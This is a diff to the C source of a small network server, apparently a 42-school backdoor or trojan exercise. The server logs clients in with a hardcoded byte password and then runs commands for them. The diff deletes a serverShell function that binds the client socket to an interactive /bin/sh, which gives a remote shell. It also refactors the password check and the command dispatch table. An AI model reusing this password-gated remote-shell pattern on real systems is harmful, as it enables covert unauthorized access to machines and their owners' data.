@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/07/15 03:19:03 by root              #+#    #+#             */
-/*   Updated: 2018/07/20 17:42:17 by root             ###   ########.fr       */
+/*   Updated: 2018/07/29 10:42:38 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -14,8 +14,6 @@
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <netdb.h>
-/* wait */
-#include <wait.h>
 
 #include "ft_dprintf.h"
 #include "main.h"
@@ -88,6 +86,16 @@ void					serverAcceptConnections()
 	close(fd);
 }
 
+static int			ustrcmp(u_char *s1, u_char *s2)
+{
+	size_t			i;
+
+	i = 0;
+	while (s1[i] && s2[i] && s1[i] == s2[i])
+		i++;
+	return (s1[i] - s2[i]);
+}
+
 static void			serverLogging(u_char *buff, int size, t_cl *client)
 {
 	memset(buff + size, 0, SERVER_CLIENT_BUFF - size);
@@ -95,10 +103,7 @@ static void			serverLogging(u_char *buff, int size, t_cl *client)
 	//kata (4): 201 121 30 74
 	//KATA (4): 44 92 192 65
 	//KatA (4): 116 103 224 84
-	if (buff[0] == 201	&&
-		buff[1] == 121	&&
-		buff[2] == 30	&&
-		buff[3] == 74) {
+	if (ustrcmp(buff, (u_char []){ 201, 121, 30, 74, 0 }) == 3) {
 		client->logged = 1;
 		clientWrite("$> ", client);
 	} else {
@@ -108,43 +113,17 @@ static void			serverLogging(u_char *buff, int size, t_cl *client)
 
 static void			serverCommands(char *buff, t_cl *client)
 {
-	static char		*cmd[] = { SERVER_COMMANDS };
-	static void		(*func[])(t_cl *) = { SERVER_FUNCTIONS };
+	static t_cmd	cmds[] = { SERVER_COMMANDS };
 	size_t			i;
 
-	for (i = 0; i < sizeof(cmd) / sizeof(*cmd); i++) {
-		if (!strcmp(cmd[i], buff)) {
-			func[i](client);
+	for (i = 0; i < sizeof(cmds) / sizeof(*cmds); i++) {
+		if (!strcmp(cmds[i].name, buff)) {
+			cmds[i].func(client, cmds);
 			break ;
 		}
 	}
-	if (i < 1)
+	if (i != 1)
 		clientWrite("$> ", client);
-}
-
-void			serverShell(t_cl *client)
-{
-	pid_t		pid;
-	int			status;
-
-	ft_dprintf(client->fd, "Spawning shell on port %s\n", SERVER_PORT);
-	pid = fork();
-	if (pid > 0) {
-		waitpid(pid, &status, WNOHANG);
-	} else if (pid == 0) {
-		char		*cmd[3];
-
-		dup2(client->fd, STDIN_FILENO);
-		dup2(client->fd, STDOUT_FILENO);
-		dup2(client->fd, STDERR_FILENO);
-		cmd[0] = "/bin/sh";
-		cmd[1] = "-i";
-		cmd[2] = NULL;
-		execv(cmd[0], cmd);
-		exit(0);
-	} else {
-		clientWrite("Failed to fork shell\n", client);
-	}
 }
 
 void				serverReadClient(t_cl *client)
@@ -154,7 +133,7 @@ void				serverReadClient(t_cl *client)
 
 	ret = read(client->fd, buff, SERVER_CLIENT_BUFF);
 	if (ret <= 0)
-		return serverQuitClient(client);
+		return serverQuitClient(client, NULL);
 	clientRead(buff, ret, client);
 	/* Here we recreate the client rd buff to get a non truncated string */
 	char *ptr = client->rd.tail;
@@ -165,10 +144,8 @@ void				serverReadClient(t_cl *client)
 			buff[ret - 1] = '\0';
 			if (!client->logged)
 				serverLogging((u_char *)buff, ret - 1, client);
-			else if (!client->shell)
+			else
 				serverCommands(buff, client);
-			/* else */
-			/* 	shell(buff, client); */
 			ret = 0;
 			client->rd.tail = moveTail(ptr, client->rd.buff, SERVER_CLIENT_BUFF);
 		}
@@ -189,7 +166,7 @@ void				serverWriteClient(t_cl *client)
 			client->wr.tail = client->wr.buff;
 		}
 		if (ret <= 0)
-			return serverQuitClient(client);
+			return serverQuitClient(client, NULL);
 	}
 }
 
